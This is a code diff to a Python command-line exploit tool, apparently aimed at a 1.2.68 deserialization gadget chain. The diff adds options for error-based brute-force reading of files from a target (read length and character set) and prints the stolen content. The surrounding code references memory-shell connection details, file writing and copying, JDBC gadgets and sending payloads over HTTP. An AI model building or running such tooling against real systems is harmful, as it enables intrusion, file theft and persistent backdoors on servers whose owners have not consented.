@@ -521,7 +521,17 @@ def poc_1268_cmd(
     content: Optional[str] = typer.Option(None, "--content", "-c", help="写入内容"),
     source: Optional[str] = typer.Option(None, "--source", help="file_copy 源路径"),
     url: Optional[str] = typer.Option(None, "--read-url", help="io_read_* URL"),
-    guess_byte: Optional[int] = typer.Option(None, "--guess-byte", help="报错读首字节"),
+    guess_byte: Optional[int] = typer.Option(None, "--guess-byte", help="报错读单字节探测"),
+    read_length: Optional[int] = typer.Option(
+        None,
+        "--read-length",
+        help="io_read_error 爆破读最大字节数（配合 --send）",
+    ),
+    read_charset: str = typer.Option(
+        "mixed",
+        "--read-charset",
+        help="爆破码表：mixed / lower / printable",
+    ),
     host: Optional[str] = typer.Option(None, "--host", help="MySQL/PG host"),
     port: Optional[int] = typer.Option(None, "--port", help="MySQL/PG port"),
     jdbc_url: Optional[str] = typer.Option(None, "--jdbc-url", help="mysql_jdbc_60 URL"),
@@ -605,6 +615,8 @@ def poc_1268_cmd(
         source=source,
         url=url,
         guess_byte=guess_byte,
+        read_length=read_length,
+        read_charset=read_charset,
         host=host,
         port=port,
         jdbc_url=jdbc_url,
@@ -640,6 +652,14 @@ def poc_1268_cmd(
         rprint(Panel(result.summary, title=f"1.2.68 / {result.gadget}", border_style="cyan"))
         if result.memshell_connect:
             rprint(Panel(result.memshell_connect, title="memshell 连接信息", border_style="green"))
+        if result.read_content is not None:
+            rprint(
+                Panel(
+                    repr(result.read_content),
+                    title=f"报错读内容 ({len(result.read_bytes or [])} bytes)",
+                    border_style="green",
+                )
+            )
         rprint(result.payload[:2000] + ("..." if len(result.payload) > 2000 else ""))
         if result.sent and result.status_code is not None:
             rprint(f"[dim]HTTP {result.status_code}[/dim]")
